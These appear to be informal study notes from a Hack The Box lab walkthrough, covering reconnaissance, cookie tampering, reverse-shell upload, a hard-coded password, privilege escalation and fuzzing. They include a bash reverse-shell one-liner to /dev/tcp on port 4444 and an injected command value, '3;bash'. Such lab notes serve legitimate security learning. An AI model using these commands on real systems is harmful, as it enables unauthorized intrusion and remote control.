Jeff's hack the box walkthrough:
- login
- download config file
- use openvpn


ligolo : port forwarding when attacking networks


nmap
ping (ip)
could try sshing,
gobuster: learned that it's a php based site. 
View src, search for href and src
now doing burpsuite (might have to say http not https)
--> login page does a POST
change the cookie
-- logged in, upload reverse shell
ls -al *
$conn = mysqli_connect(")
--> hard-coded passwd

big bash command, wikll need to replace w/ %20s and such
bash -c "bash -i >&/dev/tcp/$my_ip/4444 0>&1"

find / -group bugtracker
find / -group bugtracker 2>/dev/null (fd 2 goes to trash)

make terminal small, if goes out, can ! and run commands
3;bash

fuzzing: have a server, don't know what it will do, so throw a bunch at it (what gobuster does)
    - ex. Online app: what input can you give it to make it crash
    - gobuster: -x <php,txt,pdf> flag: try sticking php,txt, pdf at the end of everything
